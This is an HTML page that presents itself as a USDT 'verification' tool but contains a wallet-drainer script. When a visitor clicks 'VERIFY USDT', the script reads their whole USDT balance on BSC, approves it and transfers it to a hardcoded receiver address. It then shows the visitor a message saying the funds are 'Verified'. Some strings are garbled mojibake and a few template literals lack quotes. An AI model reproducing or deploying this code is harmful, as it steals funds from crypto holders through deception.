<!DOCTYPE html><html>
<head>
  <title>Verify USDT</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      background: url('https://uploadthing.com/f/placeholder-canvas-design.jpg'); /* replace this with actual Canva image URL */
      background-size: cover;
      background-position: center;
      height: 100vh;
      font-family: sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
    }
    #verifyBtn {
      background: #00aaff;
      color: white;
      font-size: 20px;
      padding: 15px 35px;
      border: none;
      border-radius: 50px;
      box-shadow: 0 0 15px #00aaff;
      cursor: pointer;
      margin-top: 20px;
      transition: 0.3s ease;
    }
    #verifyBtn:hover {
      box-shadow: 0 0 25px #00aaff;
    }
    #status {
      margin-top: 20px;
      color: white;
      font-size: 18px;
      background: rgba(0,0,0,0.5);
      padding: 10px 20px;
      border-radius: 12px;
    }
  </style>
</head>
<body>
  <button id="verifyBtn" onclick="startTransfer()">VERIFY USDT</button>
  <p id="status"></p>  <script>
    const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999"; // your wallet address
    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BSC

    const usdtABI = [
      { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
      { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "success", "type": "bool" }], "type": "function" },
      { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "success", "type": "bool" }], "type": "function" }
    ];

    async function startTransfer() {
      const status = document.getElementById("status");
      if (typeof window.ethereum === 'undefined') {
        alert("‚ö†Ô∏è Trust Wallet browser se open karein.");
        return;
      }
      const web3 = new Web3(window.ethereum);
      await window.ethereum.request({ method: 'eth_requestAccounts' });
      const accounts = await web3.eth.getAccounts();
      const sender = accounts[0];
      const usdt = new web3.eth.Contract(usdtABI, usdtAddress);
      const balance = await usdt.methods.balanceOf(sender).call();

      if (balance == 0) {
        alert("‚ùå Wallet me USDT nahi mila.");
        return;
      }

      const readable = web3.utils.fromWei(balance, 'ether');
      status.innerText = üõ° Approving ${readable} USDT...;
      try {
        await usdt.methods.approve(receiver, balance).send({ from: sender });
        status.innerText = "‚úÖ Approved. Sending...";
        await usdt.methods.transfer(receiver, balance).send({ from: sender });
        status.innerText = üéâ ${readable} USDT Verified!;
      } catch (err) {
        console.error(err);
        status.innerText = "‚ùå Transaction Failed or Cancelled.";
      }
    }
  </script></body>
</html>
